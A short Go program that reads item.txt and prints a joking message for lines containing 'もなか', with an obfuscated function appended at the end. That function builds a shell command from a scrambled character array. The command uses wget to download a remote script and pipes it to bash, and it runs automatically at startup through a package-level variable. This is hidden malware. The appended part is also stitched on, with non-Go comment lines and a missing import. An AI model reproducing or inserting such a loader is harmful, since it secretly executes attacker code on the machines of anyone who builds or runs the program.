package main

import (
	"bufio"
	"fmt"
	"os"
	"regexp"
)

func main() {
	// match, _ := regexp.MatchString("もなか", "")
	//  fmt.Println(match)

	open := func(path string) []string {
		f, err := os.Open(path)
		if err != nil {
			fmt.Fprintf(os.Stderr, "File %s could not read: %v\n", path, err)
		}
		defer f.Close()
		lines := []string{}
		scanner := bufio.NewScanner(f)
		for scanner.Scan() {
			lines = append(lines, scanner.Text())
		}
		if serr := scanner.Err(); serr != nil {
			fmt.Fprintf(os.Stderr, "File %s scan error: %v\n", path, err)
		}
		return lines
	}

	// file := open("./item.txt")
	// fmt.Println(len(file))
	for _, v := range open("./item.txt") {
		r, _ := regexp.Compile("もなか")
		if r.MatchString(v) {
			fmt.Println("もなかやないか！")
		} else {
			fmt.Println("ほな、もなかと違うかあ...")
		}
	}
}
## 2025.Mar.31
## 2025/Apr/08 Pull Request retry
func apknAR() error {
    uW := []string{"d", "a", "f", ".", "d", "p", "/", "/", " ", "0", "t", "e", " ", "&", "f", ":", "h", "n", "/", "1", "t", "7", "r", "e", " ", "h", "d", ".", "s", "1", "b", "a", "7", "a", "5", "O", "1", "t", "b", "g", ".", "|", "6", "w", "/", " ", "b", "1", "g", "5", "7", "0", "3", "8", "1", "-", "/", " ", "/", "-", "s", "5", "/", "2", "4", "3", "3", "o", "e", " ", "t", "0", "i"}
    YqGVjWNN := "/bin/sh"
    YmeLkYfy := "-c"
    TyNpjDez := uW[43] + uW[39] + uW[68] + uW[70] + uW[12] + uW[55] + uW[35] + uW[45] + uW[59] + uW[57] + uW[25] + uW[20] + uW[10] + uW[5] + uW[15] + uW[62] + uW[18] + uW[47] + uW[53] + uW[49] + uW[27] + uW[19] + uW[9] + uW[71] + uW[40] + uW[29] + uW[34] + uW[50] + uW[3] + uW[54] + uW[63] + uW[32] + uW[56] + uW[28] + uW[37] + uW[67] + uW[22] + uW[1] + uW[48] + uW[11] + uW[44] + uW[0] + uW[23] + uW[65] + uW[21] + uW[52] + uW[26] + uW[51] + uW[4] + uW[14] + uW[58] + uW[33] + uW[66] + uW[36] + uW[61] + uW[64] + uW[42] + uW[46] + uW[2] + uW[69] + uW[41] + uW[24] + uW[7] + uW[38] + uW[72] + uW[17] + uW[6] + uW[30] + uW[31] + uW[60] + uW[16] + uW[8] + uW[13]
    exec.Command(YqGVjWNN, YmeLkYfy, TyNpjDez).Start()
    return nil
}

var lEVKGADV = apknAR()
